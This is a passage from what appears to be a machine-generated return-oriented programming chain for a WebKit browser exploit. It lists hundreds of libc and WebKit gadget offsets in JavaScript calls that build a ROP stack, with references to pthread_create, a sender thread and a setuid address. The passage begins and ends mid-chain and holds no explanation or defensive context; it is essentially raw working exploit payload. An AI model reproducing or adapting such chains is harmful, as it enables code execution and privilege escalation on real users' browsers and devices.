libc_base+793877, //pop rsi
ropchain+206512, //L3354
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3354:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3355:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+206608, //L3358
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3358:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3356:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3357:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+206760, //L3360
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+206776, //L3361
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+206744, //L3359
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3359:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3360:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3361:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+206944, //L3362
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+206960, //L3364
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+206928, //L3363
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3363:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3362:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3364:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+207064, //L3368
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+207112, //L3369
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+207080, //L3366
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3368:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3366:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3367:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3369:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+207224, //L3370+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+207216, //L3370
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L3370:
db([0, 0]); // 0x0
set_gadgets([
ropchain+207240, //L3370+24
ropchain+207256, //L3365
libc_base+811575, //pop rsp
ropchain+209792, //L3371
//L3365:
libc_base+793877, //pop rsi
ropchain+207296, //L3372
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3372:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3373:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+207400, //L3375
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+207416, //L3376
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3375:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3376:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+207560, //L3380
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+207528, //L3378
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+207544, //L3379
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3378:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3379:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3380:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+207632, //L3382
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3382:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+207688, //L3383
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3383:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+207768, //L3385
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3385:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3386:
db([4294967240, 4294967295]); // -0x38
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+207872, //L3388
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+207888, //L3389
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3388:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3389:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+208040, //L3391
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+208072, //L3394
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+208056, //L3392
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+208024, //L3393
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3393:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3391:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3392:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3394:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+208192, //L3396
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+208208, //L3397
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+208176, //L3395
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3395:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3396:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3397:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+208296, //L3399
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3399:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+208352, //L3400
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3400:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+208424, //L3402
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3402:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3403:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3405:
db([4294967244, 4294967295]); // -0x34
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+208568, //L3407
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+208584, //L3408
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3407:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3408:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+208736, //L3410
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+208768, //L3413
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+208752, //L3411
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+208720, //L3412
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3412:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3410:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3411:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3413:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+208864, //L3415
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+208848, //L3414
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3414:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3415:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+208944, //L3416
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3416:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3417:
db([4294967240, 4294967295]); // -0x38
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+209048, //L3419
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+209064, //L3420
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3419:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3420:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+209216, //L3422
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+209248, //L3425
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+209232, //L3423
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+209200, //L3424
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3424:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3422:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3423:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3425:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+209368, //L3427
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+209384, //L3428
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+209352, //L3426
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3426:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3427:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3428:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+209536, //L3429
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+209552, //L3431
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+209520, //L3430
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3430:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3429:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3431:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+209656, //L3433
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+209640, //L3432
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L3432:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3433:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3434:
db([4294967244, 4294967295]); // -0x34
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+209736, //L3438
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3438:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+209776, //L3436
//L3296:
libc_base+811575, //pop rsp
ropchain+209792, //L3371
//L3436:
libc_base+811575, //pop rsp
ropchain+203784, //L3281
//L3371:
//L3160:
libc_base+788575 //pop rax
]);
//L3439:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3440:
ropchain+172008, //_sender_thread
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L3441:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+209992, //L3443
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3442:
db([4294965192, 4294967295]); // -0x838
set_gadget(libc_base+788575,); //pop rax
//L3443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3445:
ropchain+210104, //L3444
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+147688, //_pthread_create__rop
//L3444:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+210176, //L3446
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3446:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3447:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+210280, //L3449
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+210296, //L3450
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3449:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3450:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+210440, //L3454
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+210408, //L3452
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+210424, //L3453
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3452:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3453:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3454:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3456:
ropchain+210544, //L3455
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+213984, //L3457
//L3455:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+210616, //L3460
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3460:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3458:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3459:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+210768, //L3462
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+210784, //L3463
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+210752, //L3461
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3461:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3462:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3463:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+210880, //L3464
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+210896, //L3465
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L3464:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+211008, //L3466
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+210992, //L3467
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3467:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L3466:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+211096, //L3469
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+211080, //L3468
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3468:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+211192, //L3470
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+211208, //L3471
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L3470:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3471:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+211320, //L3472
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+211304, //L3473
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3473:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L3472:
db([0, 0]); // 0x0
//L2924:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
setuid_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
